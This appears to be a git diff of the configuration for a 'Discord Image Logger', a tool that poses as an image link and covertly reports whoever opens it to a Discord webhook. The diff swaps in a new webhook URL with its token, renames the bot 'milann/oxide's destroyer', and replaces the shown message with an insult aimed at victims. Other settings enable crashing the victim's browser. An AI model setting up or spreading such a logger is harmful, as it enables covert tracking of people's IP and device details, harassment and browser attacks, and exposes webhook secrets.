@@ -12,14 +12,14 @@ __author__ = "DeKrypt/Oxide_stg"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1386302129634934894/JLOoP2l2iHje1rL6GO5ChafsKYEUr7nQ0o8WlxchQKsppQ_4kWDMwdX3O-W3NjOIDfqz",
+    "webhook": "https://discord.com/api/webhooks/1392562739636867222/GMgxu6oJ-Quge3jFZ8Y7NW6CHqc34rNuFBYtWUMJYhrUsAyBDTKA9Qv_Ze96Do4Aq-og",
     "image": "https://ih1.redbubble.net/image.5666933092.2296/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.u2.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "milann/oxide's destroyer", # Set this to the name you want the webhook to have
+    "color": 0x240073, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "Get fucked risktard/TIP tard https://discord.gg/DNR8ANmM", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -37,7 +37,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
